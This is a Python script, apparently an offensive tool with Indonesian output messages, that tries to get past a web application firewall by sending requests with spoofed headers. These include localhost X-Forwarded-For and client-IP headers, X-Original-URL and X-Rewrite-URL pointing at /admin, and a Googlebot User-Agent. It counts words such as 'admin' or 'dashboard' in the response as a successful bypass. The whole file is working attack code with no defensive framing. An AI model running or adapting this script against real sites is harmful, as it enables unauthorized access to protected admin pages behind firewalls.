import requests
import logging
import os
from typing import TypedDict, List

# Ensure logs directory exists
os.makedirs('logs', exist_ok=True)

logging.basicConfig(filename='logs/results.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class BypassTechnique(TypedDict):
    name: str
    headers: dict[str, str]

def bypass_waf(url: str, payload: str) -> bool:
    """
    Attempt to bypass WAF using various header manipulation techniques.
    
    Args:
        url: Target URL to test
        payload: Payload to send (for logging purposes)
        
    Returns:
        bool: True if bypass successful, False otherwise
    """
    # Multiple bypass techniques to try
    bypass_techniques: List[BypassTechnique] = [
        {
            "name": "X-Forwarded Headers",
            "headers": {
                "X-Forwarded-For": "127.0.0.1",
                "X-Forwarded-Host": "localhost",
                "X-Original-URL": "/admin",
                "X-Rewrite-URL": "/admin"
            }
        },
        {
            "name": "X-Originating-IP",
            "headers": {
                "X-Originating-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Remote-Addr": "127.0.0.1"
            }
        },
        {
            "name": "X-Client-IP",
            "headers": {
                "X-Client-IP": "127.0.0.1",
                "True-Client-IP": "127.0.0.1",
                "Client-IP": "127.0.0.1"
            }
        },
        {
            "name": "Custom User-Agent",
            "headers": {
                "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
            }
        },
        {
            "name": "Referer Bypass",
            "headers": {
                "Referer": url,
                "X-Referer": url
            }
        }
    ]
    
    for technique in bypass_techniques:
        try:
            logging.info(f"Attempting WAF bypass using: {technique['name']} on {url}")
            response = requests.get(url, headers=technique['headers'], timeout=10)
            response.raise_for_status()
            
            # Check for successful bypass indicators
            success_indicators = ["admin", "dashboard", "welcome", "panel", "login successful"]
            
            if response.text and any(indicator in response.text.lower() for indicator in success_indicators):
                logging.info(f"WAF bypass successful using {technique['name']}: {payload}")
                print(f"[+] Bypass WAF berhasil dengan {technique['name']}: {payload}")
                return True
                
        except requests.exceptions.Timeout:
            logging.warning(f"Timeout during WAF bypass attempt with {technique['name']}")
            print(f"[!] Timeout: {technique['name']}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Request error during WAF bypass with {technique['name']}: {e}")
            print(f"[!] Request Error ({technique['name']}): {e}")
        except Exception as e:
            logging.error(f"Unexpected error during WAF bypass with {technique['name']}: {e}")
            print(f"[!] Unexpected Error ({technique['name']}): {e}")
    
    logging.info(f"All WAF bypass techniques failed for {url}")
    print(f"[-] Semua teknik bypass WAF gagal untuk {url}")
    return False